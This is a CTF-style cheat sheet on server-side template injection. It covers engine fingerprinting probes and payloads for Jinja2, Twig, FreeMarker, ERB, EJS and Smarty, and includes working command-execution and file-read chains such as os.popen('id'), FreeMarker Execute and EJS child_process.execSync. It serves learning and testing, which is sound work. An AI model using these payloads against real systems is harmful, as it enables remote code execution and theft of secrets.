---
title: "SSTI · Identify the Engine First"
weight: 20
bookToc: true
---

# Server-side template injection

**Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed.** A reflected `49` identifies expression evaluation, not a particular engine and not command execution.

## 1. First requests

Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.

| Raw input | Control | Interpretation |
| --- | --- | --- |
| `AA{{7*7}}ZZ` | `AA{{7*8}}ZZ` | `AA49ZZ` / `AA56ZZ`: expression evaluation in this delimiter family |
| `AA${7*7}ZZ` | `AA${7*8}ZZ` | FreeMarker, EL or another `${}` engine; investigate |
| `AA<%= 7*7 %>ZZ` | `AA<%= 7*8 %>ZZ` | ERB/EJS family; distinguish Ruby from JavaScript |
| `AA#{7*7}ZZ` | `AA#{7*8}ZZ` | Some Ruby/Pug/EL contexts; only meaningful with supporting syntax |
| `AA{7*7}ZZ` | `AA{7*8}ZZ` | Smarty-like arithmetic possible |

Inspect **raw HTTP**, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static `49` elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.

```http
POST /preview HTTP/1.1
Host: ctf.invalid
Content-Type: application/x-www-form-urlencoded

name=AA%7B%7B7*7%7D%7DZZ
```

Inside a decoded parameter editor, paste `AA{{7*7}}ZZ`. In JSON, use `{"name":"AA{{7*7}}ZZ"}`. Avoid applying URL encoding to the entire JSON body.

## 2. Identify with a second independent signal

| Family | Additional test | Useful evidence / caveat |
| --- | --- | --- |
| Jinja2 | `{{7*'7'}}` → seven 7s; `{{'ab'|upper}}` → AB | Repeat plus Python/Jinja traceback or Flask globals; Nunjucks and other engines overlap |
| Twig | `{{7*'7'}}` → 49 in compatible numeric coercion | `{{_self}}`, `{{constant('PHP_VERSION')}}` where allowed; PHP/Twig error names |
| FreeMarker | `${"ab"?upper_case}` → AB | `<#assign x=7>${x*7}`; `.version` special variable |
| ERB | `<%= 'ab'.upcase %>` → AB | Ruby class names; `<%= RUBY_VERSION %>` |
| EJS | `<%= 'ab'.toUpperCase() %>` → AB | JS `ReferenceError`, `typeof process`; Ruby `.upcase` fails |
| Smarty | `{$smarty.version}` | Version exposure may be restricted; Smarty compiler errors |
| Nunjucks | `{{7*7}}`, JS-oriented exposed objects | Jinja payloads using Python globals do not transfer |
| Handlebars | `{{#if true}}YES{{/if}}` | Arithmetic inside double braces is not a general Handlebars expression |

Do not label `${7*7}` “Java RCE” or assume Twig because Jinja multiplication behaves differently. Capture an engine-specific object, error or source dependency. Undefined variables often render empty.

## 3. Jinja2 / Flask: inspect before executing

Start with context objects; these can expose the answer without shell access.

```jinja2
{{ self }}
{{ config }}
{{ request }}
{{ request.application }}
{{ session }}
{{ config.items() }}
{{ request.environ }}
{{ url_for.__globals__ }}
```

`config`, `request`, `session` and `url_for` are **Flask context conveniences**, not guaranteed Jinja globals. Request-dependent objects can be unavailable in offline render jobs. `config` can include secrets; it does not necessarily include the flag.

For a normal, unsandboxed environment exposing standard Jinja helpers:

```jinja2
{{ cycler.__init__.__globals__ }}
{{ cycler.__init__.__globals__.os.getcwd() }}
{{ cycler.__init__.__globals__.os.listdir('/') }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

These depend on helper implementation/global contents and unrestricted internal attribute access. `SecurityError: ... unsafe` is evidence of sandbox restrictions; these are **not modern sandbox escapes**. Read available objects and app source rather than repeatedly sending the same private-attribute chain.

If a reachable function exposes Python builtins, examine whether `__builtins__` is a mapping or module. The following mapping form is conditional:

```jinja2
{{ url_for.__globals__['__builtins__']['open']('/flag.txt').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('os').listdir('/') }}
```

### Attribute syntax and narrow string filters

Where equivalent attribute access is allowed:

```jinja2
{{ cycler['__init__']['__globals__']['os'].popen('id').read() }}
{{ (cycler|attr('__init__')|attr('__globals__'))['os'].popen('id').read() }}
{{ cycler|attr('\x5f\x5finit\x5f\x5f') }}
{{ request|attr(request.args.a) }}
```

For the last example, append `&a=application` to the same request. A filter that checks only one parameter may miss another. Hex escapes build the same attribute string inside a quoted template string; they do not defeat a sandbox's actual attribute policy. The `attr` filter looks up attributes; mapping keys still need subscription.

### Object graph route when helpers are absent

```jinja2
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Inspect the list and identify the actual class before using it. Subclass indexes vary by Python build, imported modules and process state. A copied `__subclasses__()[396]` is not a portable payload. A subprocess class may not be imported at all. Stay with a simpler exposed function/global when available.

### Blind or hidden result

```jinja2
{% if 7*7 == 49 %}YES{% else %}NO{% endif %}
{% if config.get('DEBUG') %}YES{% else %}NO{% endif %}
```

A controlled marker is easier to reason about than a timeout. Inspect downstream email/PDF/export output if the preview only says “queued.”

## 4. Twig / PHP

```twig
{{7*7}}
{{'ab'|upper}}
{{_self}}
{{constant('PHP_VERSION')}}
{% for k,v in _context %}{{k}}:{{v}};{% endfor %}
```

`constant()` may be restricted or unavailable in a sandbox; exposed `_context` values and application services are more useful than guessing universal helpers.

Historical or permissive Twig setups may accept PHP callable strings in sequence filters:

```twig
{{ ['id']|filter('system')|join(',') }}
{{ ['id']|map('system')|join(',') }}
```

Treat these as **legacy/configuration-dependent candidates**, not universal Twig 3 payloads. Modern sandbox policy and versions can require closures, reject the callable, or restrict functions. A rejection identifies a constraint. Current documented arrow syntax, such as `{{[1,2]|map(v => v*2)|join(',')}}`, proves the filter is available; it does not prove arbitrary PHP execution.

Old `_self.env.registerUndefinedFilterCallback(...)` recipes target historical Twig internals. Do not spend time on them unless source/version matches. For modern targets, inspect deliberately exposed app objects, template loaders, custom functions and extensions.

## 5. FreeMarker / Java

```freemarker
${7*7}
${"ab"?upper_case}
${.version}
<#assign x=7>${x*7}
<#list .data_model?keys as k>${k} </#list>
```

Special variable access and model enumeration depend on wrapper/configuration. A hash-like model may expose keys, while another wrapper does not.

With an unrestricted class resolver that allows the class:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
```

`?new` class resolution can deny `Execute` and other dangerous classes. `?api` additionally needs `api_builtin_enabled=true` **and** an object wrapper supporting API access. Seeing `${7*7}` succeed does not establish either condition. Inspect named exposed Java objects if `?new` is blocked. File includes normally resolve through a configured template loader, not unrestricted filesystem reads.

## 6. ERB / Ruby

```erb
<%= 7*7 %>
<%= 'ab'.upcase %>
<%= RUBY_VERSION %>
<%= self.class %>
<%= Dir.pwd %>
<%= Dir.entries('/') %>
<%= File.read('/flag.txt') %>
<%= `id` %>
```

These require actual ERB template-source control in a Ruby context that permits those constants/methods. An app rendering your input as a variable inside ERB does not compile the input again. HTML-escaped file output is still readable in source.

## 7. EJS / Node

```ejs
<%= 7*7 %>
<%= 'ab'.toUpperCase() %>
<%= typeof process %>
<%= typeof require %>
<%= Object.keys(locals).join(',') %>
```

`locals` name and exposure depend on EJS options. If a CommonJS `require` binding is actually passed into the render context:

```ejs
<%= require('fs').readdirSync('/').join(',') %>
<%= require('fs').readFileSync('/flag.txt','utf8') %>
<%= require('child_process').execSync('id').toString() %>
```

`require` is not a universal template global. ESM applications and restricted render contexts can lack it. `process.mainModule.require(...)` is an old, environment-dependent route; `mainModule` may be absent. Use the actual bindings exposed by source. Ordinary EJS escaped/unescaped output tags do not evaluate user-supplied strings as template source.

## 8. Smarty

```smarty
{7*7}
{$smarty.version}
{$smarty.template}
{assign var=x value=7}{$x*7}
{fetch file='/flag.txt'}
```

`fetch` needs an available plugin and policy allowing the path; security mode restricts accessible directories. PHP-function modifiers, `{php}` blocks and old object chains are **not portable** across Smarty generations. Use the reported version and security configuration. An include may interpret a template instead of returning raw file bytes.

## 9. If the payload fails

| Observation | Next action |
| --- | --- |
| Literal braces | Check raw bytes, render stage and whether input is template data |
| Only browser evaluates | Investigate client-side template/DOM flow |
| 500 on every delimiter | Use paired arithmetic and inspect error names; malformed input alone proves little |
| Valid arithmetic, empty object | Try a defined constant/string before concluding sandbox |
| `SecurityError` / denied class | Record policy; enumerate exposed safe data / source |
| Output escaped | View response source; HTML escaping does not stop server evaluation |
| File missing | Enumerate directory through the confirmed primitive; stop guessing filenames |
| URL stops at `#` or `&` | Encode for the transport; fragments are never sent to server |

## Tool workflow

Use [Burp Community Repeater](../../ajcbbc_allow_tools/burp_suite_community/) for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.

## References

Engine syntax and restrictions: [Jinja sandbox](https://jinja.palletsprojects.com/en/stable/sandbox/), [Twig map](https://twig.symfony.com/doc/3.x/filters/map.html), [FreeMarker expert builtins](https://freemarker.apache.org/docs/ref_builtins_expert.html), [Ruby ERB](https://docs.ruby-lang.org/en/master/ERB.html), [EJS documentation](https://ejs.co/), [Smarty fetch and security](https://www.smarty.net/docs/en/language.function.fetch.tpl). General workflow: [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection).
